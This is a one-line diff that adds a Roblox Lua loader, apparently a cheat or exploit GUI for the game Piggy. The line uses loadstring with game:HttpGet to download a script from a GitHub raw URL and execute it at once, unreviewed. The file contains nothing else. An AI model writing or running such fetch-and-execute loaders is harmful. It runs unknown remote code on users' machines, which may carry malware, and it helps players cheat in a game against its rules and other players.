@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZaneTheKing1223/Piggy-Gui/main/Piggy-Gui"))()
